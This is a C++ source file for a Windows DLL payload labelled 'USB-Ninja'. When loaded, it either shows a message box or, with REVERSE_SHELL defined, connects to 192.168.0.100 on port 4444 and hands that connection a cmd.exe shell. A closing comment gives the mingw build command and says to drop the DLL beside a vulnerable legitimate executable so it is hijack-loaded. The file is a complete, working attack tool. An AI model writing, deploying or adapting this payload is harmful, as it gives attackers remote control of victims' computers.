// dll_payload.cpp
#define _WIN32_WINNT 0x0600        
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>             

#pragma comment(lib, "ws2_32.lib")

static BOOL CreateReverseShell(const char* ip, unsigned short port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa)) return FALSE;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    sockaddr_in srv{};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);

    if (connect(s, reinterpret_cast<sockaddr*>(&srv), sizeof(srv)) == SOCKET_ERROR)
        return FALSE;

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = reinterpret_cast<HANDLE>(s);

    return CreateProcessA(nullptr, const_cast<LPSTR>("cmd.exe"),
                          nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
#ifdef REVERSE_SHELL
        (void)CreateReverseShell("192.168.0.100", 4444); // adjust ip-port
#else
        MessageBoxA(nullptr, "Ninja payload ejecutado",
                    "USB-Ninja", MB_OK | MB_ICONINFORMATION);
#endif
    }
    return TRUE;
}

/*
┌─ Compilation ───────────────────────────────────────────────┐
│                                                                                                      

x86_64-w64-mingw32-g++ -shared -o dll_payload.dll dll_payload.cpp -lws2_32

│ place dll_payload.dll next to legit vulnerable EXE        . │
└─────────────────────────────────────────────────────────────┘

*/